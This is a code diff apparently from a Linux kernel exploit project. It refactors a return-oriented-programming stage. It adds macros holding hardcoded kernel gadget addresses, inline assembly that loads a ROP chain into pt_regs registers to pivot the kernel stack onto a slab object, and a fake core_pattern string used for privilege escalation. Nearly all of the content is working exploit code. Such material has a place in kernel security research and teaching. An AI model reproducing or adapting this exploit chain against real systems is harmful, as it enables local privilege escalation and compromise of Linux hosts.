@@ -43,8 +43,13 @@
 #include <sys/sendfile.h>
 #include "drill.h"
 
+#define STR_EXPAND(arg) #arg
+#define STR(arg) STR_EXPAND(arg)
+
 #define MMAP_SZ				(PAGE_SIZE * 2)
 #define PAYLOAD_SZ			95
+
+static const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";
 
 /* ============================== Kernel stuff ============================== */
 
@@ -57,8 +62,13 @@
 #define STACKPIVOT_GADGET_PTR		0xffffffff811d9489UL /* add rsp, 0x1a8 ; ret */
 #define POP_RDX_POP_RDI			0xffffffff8158f54fUL /* pop rdx ; pop rdi ; ret */
 #define POP_RSI				0xffffffff81d1da59UL /* pop rsi ; ret */
-
-static const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";
+#define POP_RAX				0xffffffff810604c4UL /* pop rax ; ret */
+#define PUSH_RSP_POP_RSI_POP_RBX	0xffffffff810e5abcUL /* push rsp ; pop rsi ; pop rbx ; ret */
+#define POP_R15				0xffffffff810040adUL /* pop r15 ; ret */
+#define SUB_RSI_RAX			0xffffffff813f50d5UL /* sub rsi, rax ; mov rax, rcx ; sub rax, rsi ; ret */
+#define MOV_RAX_QWORD_PTR_RSI		0xffffffff812dcc30UL /* mov rax, qword ptr [rsi] ; ret */
+#define PUSH_RAX_POP_RSP_ADD_RSP_0X10	0xffffffff814d71faUL /* push rax ; pop rsp ; jmp 0xffffffff814d72ad
+								where 0xffffffff814d72ad contains: add rsp,0x10 ; ret */
 
 /* ========================================================================== */
 
@@ -83,22 +93,21 @@ int do_cpu_pinning(int cpu_n)
 void do_ptregs_pass(void)
 {
 	/*
-      	 * Let's abuse `pt_regs` to store arbitrary data at the bottom of the kernel stack,
-     	 * and then jump to that data via STACKPIVOT_GADGET_PTR. We need this jump to
-     	 * find the drill_item_t pointer stored on the stack and jump to drill_item_t on the heap.
-     	 */
+	 * Let's place the ROP chain #1 in the pt_regs that reside at the end
+	 * (i.e. top) of the kernel stack. These gadgets calculate the address
+	 * of the ROP chain #2 inside the drill_item_t object (allocated in slab)
+	 * and perform stack pivoting onto it.
+	 */
 	__asm__ __volatile__(".intel_syntax noprefix\n\t"
-		"mov r14, 0xffffffff810604c4\n\t" /* : pop rax ; ret */
-		"mov r13, 0x00000000000001e0\n\t" /* => rax */
-		"mov r12, 0xffffffff810e5abc\n\t" /* : push rsp ; pop rsi ; pop rbx ; ret */
+		"mov r14, " STR(POP_RAX) "\n\t"
+		"mov r13, 0x00000000000001e0\n\t" /* value for rax */
+		"mov r12, " STR(PUSH_RSP_POP_RSI_POP_RBX) "\n\t"
 		/* hole => dummy rbx */
-		"mov rbx, 0xffffffff810040ad\n\t" /* : pop r15 ; ret */
+		"mov rbx, " STR(POP_R15) "\n\t"
 		/* hole => dummyy r15 */
-		"mov r10, 0xffffffff813f50d5\n\t" /* : sub rsi, rax ; mov rax, rcx ; sub rax, rsi ; ret */
-		"mov r9, 0xffffffff812dcc30\n\t" /*  : mov rax, qword ptr [rsi] ; ret */
-		"mov r8, 0xffffffff814d71fa\n\t" /* : push rax ; pop rsp ; jmp 0xffffffff814d72ad
-									   <0xffffffff814d72ad> :    add    rsp,0x10
-									   <0xffffffff814d72b1> :    ret */
+		"mov r10, " STR(SUB_RSI_RAX) "\n\t"
+		"mov r9, " STR(MOV_RAX_QWORD_PTR_RSI) "\n\t"
+		"mov r8, " STR(PUSH_RAX_POP_RSP_ADD_RSP_0X10) "\n\t"
 		".att_syntax prefix");
 }
 
